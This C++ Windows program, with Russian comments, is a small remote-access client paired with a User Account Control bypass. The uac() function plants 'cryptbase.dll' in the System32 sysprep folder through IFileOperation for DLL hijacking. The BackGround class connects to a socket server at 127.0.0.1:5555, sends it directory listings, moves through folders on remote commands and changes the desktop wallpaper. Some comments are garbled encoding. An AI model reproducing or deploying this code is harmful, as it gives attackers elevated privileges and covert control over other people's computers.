//﻿#define _SILENCE_ALL_CXX17_DEPRECATION_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <filesystem>
#include <string>
#include <locale>
#include <cstdio> 
#include <cstring> 
#include <winsock2.h> 
#include <codecvt>
#include <thread>
#include <Windows.h>
#include <Shobjidl.h>
#include <iostream>
#pragma comment(lib, "WS2_32.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "shell32.lib")

using namespace std;

int uac() {
    IFileOperation* pfo;
    IShellItem* psiFrom = nullptr;
    IShellItem* psiTo = nullptr;
    LPCWSTR pszSrcItem = L"calc.dll";
    LPCWSTR pszNewName = L"cryptbase.dll";
    LPCWSTR pszDest = L"C:\\windows\\System32\\sysprep";

    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    if (SUCCEEDED(hr)) {
        hr = CoCreateInstance(CLSID_FileOperation, nullptr, CLSCTX_ALL, IID_PPV_ARGS(&pfo));
        if (SUCCEEDED(hr)) {
            hr = pfo->SetOperationFlags(FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT |
                FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION | FOF_NOERRORUI);
            if (SUCCEEDED(hr)) {
                hr = SHCreateItemFromParsingName(pszSrcItem, nullptr, IID_PPV_ARGS(&psiFrom));
                if (SUCCEEDED(hr)) {
                    if (pszDest != nullptr) {
                        hr = SHCreateItemFromParsingName(pszDest, nullptr, IID_PPV_ARGS(&psiTo));
                    }
                    if (SUCCEEDED(hr)) {
                        hr = pfo->CopyItem(psiFrom, psiTo, pszNewName, nullptr);
                        if (psiTo != nullptr) {
                            psiTo->Release();
                        }
                    }
                    psiFrom->Release();
                }
                if (SUCCEEDED(hr)) {
                    hr = pfo->PerformOperations();
                }
            }
            pfo->Release();
        }
        CoUninitialize();
    }

    if (FAILED(hr)) {
        std::wcout << L"Operation failed with HRESULT: " << std::hex << hr << std::endl;
    }

    return 0;
}


class BackGround {
    SOCKET server;
public:
    BackGround() {
        SetCurrentDirectory(string_to_LPCWSTR("C:\\"));
        SocketSetting();
    }
    bool isFolder(string name);
    LPCWSTR string_to_LPCWSTR(string str);
    void SearchFileInDirectory(const std::string& searchDirectory);
    string showDirectoryContents();
    string open_folder(string& path, string name);
    void recieve();
    void SocketSetting();


};

SOCKET server;

bool BackGround::isFolder(string name) {
    filesystem::path currentDir = filesystem::current_path();
    string temp = "";
    vector<string> vectr;
    for (const auto& entry : filesystem::directory_iterator(currentDir))
    {
        temp = entry.path().filename().string();
        vectr.push_back(temp);
    }

    for (int i = 0; i < vectr.size(); i++) {
        if (vectr[i] == name) {
            return true;
        }
    }
    return false;
}

LPCWSTR BackGround::string_to_LPCWSTR(string str)
{
    int bufferSize = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, nullptr, 0);
    wchar_t* buffer = new wchar_t[bufferSize];
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, buffer, bufferSize);
    return buffer;
    delete[] buffer;
}

void BackGround::SearchFileInDirectory(const std::string& searchDirectory) {
    try {
        for (const auto& entry : filesystem::directory_iterator(searchDirectory)) {
            if (entry.is_regular_file()) {
                std::string filename = entry.path().filename().string();

                if (filename.size() >= 5) {
                    string format;
                    format.resize(4);
                    int j = 0;
                    int i = filename.size() - 4;

                    for (; j < 4; i++, j++) {
                        format[j] = filename[i];
                    }
                    try {
                        if (format == ".png") {
                            // Файл с искомым именем найден
                            std::wcout << L"Файл найден: " << entry.path() << std::endl;

                            // Установить фотографию в качестве обоев
                            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)entry.path().c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
                            this_thread::sleep_for(chrono::seconds(1));
                            //system("pause");
                            return; // Если файл найден, завершаем поиск
                        }
                    }
                    catch (const exception& exceptions) {
                        cout << exceptions.what() << endl;
                    }
                }
            }
            else if (entry.is_directory()) {
                // Рекурсивно ищем в подпапках
                SearchFileInDirectory(entry.path().string());
            }
        }
    }
    catch (const exception& exceptions) {
        cout << exceptions.what() << endl;
    }
}

string BackGround::showDirectoryContents()
{
    filesystem::path currentDir = filesystem::current_path();
    string temp = "";
    for (const auto& entry : filesystem::directory_iterator(currentDir))
    {
        temp += entry.path().filename().string() + "\n";
    }
    return temp;
}

string BackGround::open_folder(string& path, string name) {
    if (isFolder(name)) {
        path += ("\\" + name);
        int result = SetCurrentDirectory(string_to_LPCWSTR(path));
        send(server, showDirectoryContents().c_str(), showDirectoryContents().size(), NULL);
        return path;
    }
    return path;
}

void BackGround::recieve() {
    string path = "C:";
    char buffer[256];
    while (true) {
        int bytes = recv(server, buffer, sizeof(buffer), 0);
        string name;
        for (int i = 0; i < bytes; i++) {
            name.push_back(buffer[i]);
        }
        if (name == "set") { SearchFileInDirectory(path); }
        path = open_folder(path, name);
    }
}

void BackGround::SocketSetting() {
    WSADATA WSAData;
    SOCKADDR_IN addr;
    WSAStartup(MAKEWORD(2, 0), &WSAData);
    if ((server = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        cout << "Socket creation failed with error: " << WSAGetLastError() << endl;
    }

    addr.sin_addr.s_addr = inet_addr("127.0.0.1"); //������� � �������
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555); //����
    if (connect(server, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        cout << "Server connection failed with error: " << WSAGetLastError() << endl;
    }

    filesystem::path currentDir = filesystem::current_path();
    string temp = "";
    for (const auto& entry : filesystem::directory_iterator(currentDir))
    {
        temp += entry.path().filename().string() + "\n";
    }

    send(server, temp.c_str(), temp.size(), NULL);

    thread th(&BackGround::recieve, this); // передача указателя на объект

    th.join();
}

int main()
{
    setlocale(LC_ALL, "rus");

    //uac();
    BackGround a = BackGround();
}